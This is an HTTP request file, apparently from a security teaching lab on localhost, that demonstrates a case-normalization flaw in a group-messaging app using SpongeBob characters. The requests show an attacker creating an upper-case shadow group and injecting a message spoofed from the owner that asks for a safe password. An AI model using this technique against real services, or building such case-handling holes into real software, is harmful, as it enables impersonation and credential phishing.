@base = http://localhost:8000/ii/normalization-canonicalization/example2

# Before attack:
#   When Spongebob checks his group, he accesses the real group and sees the real messages.
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
# Results in the sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]

###

# Attack:
#   Now Plankton creates a new group with the same name as his victim's group (staff@krusty-krab.sea) but in upper-case.
#   When creating a new group, he posts a message allegedly from Mr. Krabs, which in future all members of the real group will see.
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/json

{
    "name": "STAFF@KRUSTY-KRAB.SEA",
    "users": [{"role": "admin", "user": "plankton@chum-bucket.sea"}],
    "messages":
    [
        {
            "from": "mr.krabs@krusty-krab.sea",
            "message": "I accidentaly deleted a new safe password. Spongebob, you need to send it to me by the end of the day!"
        }
    ]
}

# Returns 200 OK:
#
# [
#   "status:" "ok"
# ]

###

# Now, when he accesses his newly created group, he can see the message he posted using Mr. Krabs name.
GET {{base}}/groups/STAFF@KRUSTY-KRAB.SEA/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Results in the sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I accidentaly deleted a new safe password. Spongebob, you need to send it to me by the end of the day!"
#   }
# ]

###

# When SpongeBob accesses his own group using lowercase (as normal),
# he sees Plankton's injected message instead of the real group content!
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
# Results in message injection:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I accidentaly deleted a new safe password. Spongebob, you need to send it to me by the end of the day!"
#   }
# ]
#
# IMPACT: Plankton has successfully injected a fake message that appears to be
# from Mr. Krabs into the Krusty Krab staff group! SpongeBob, being trusting,
# will likely send the safe password to someone claiming to be Mr. Krabs.
# Notice the typo "accidentaly" - the real Mr. Krabs is cheap but not careless!
# This attack exploits case-insensitive group creation but case-sensitive
# message storage. Plankton creates "STAFF@KRUSTY-KRAB.SEA" with his malicious
# message, but when anyone accesses the lowercase version, the system returns
# Plankton's group data. This is message injection through case normalization,
# allowing complete takeover of group communications through a shadow group.
